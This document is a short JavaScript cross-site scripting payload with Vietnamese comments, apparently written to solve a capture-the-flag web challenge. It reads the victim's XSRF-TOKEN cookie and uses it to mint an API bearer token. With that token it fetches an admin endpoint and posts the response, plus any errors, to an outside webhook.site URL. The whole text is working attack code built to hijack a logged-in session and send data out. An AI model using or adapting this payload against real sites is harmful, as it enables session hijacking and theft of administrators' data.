<script>
(async () => {
  const webhook = 'https://webhook.site/daa6c589-39a4-45ab-a988-b68cff448c30';

  // Lấy XSRF token từ cookie
  const token = (document.cookie.match(/XSRF-TOKEN=([^;]+)/) || [])[1];
  if (!token) return fetch(webhook + '?error=no_xsrf_token');

  try {
    // Bước 1: Lấy API token
    const r1 = await fetch('/generate-token', {
      method: 'POST',
      headers: {
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': decodeURIComponent(token),
        'Accept': 'application/json'
      }
    });
    const j1 = await r1.json();
    const apiToken = j1.token;

    // Bước 2: Lấy flag
    const r2 = await fetch('/api/admin/sup3rs3cr3t', {
      headers: {
        'Authorization': 'Bearer ' + apiToken,
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json'
      }
    });
    const flag = await r2.text();

    // Gửi flag về webhook
    fetch(webhook, {
      method: 'POST',
      body: flag
    });
  } catch (e) {
    fetch(webhook + '?error=' + encodeURIComponent(e.message));
  }
})();
</script>
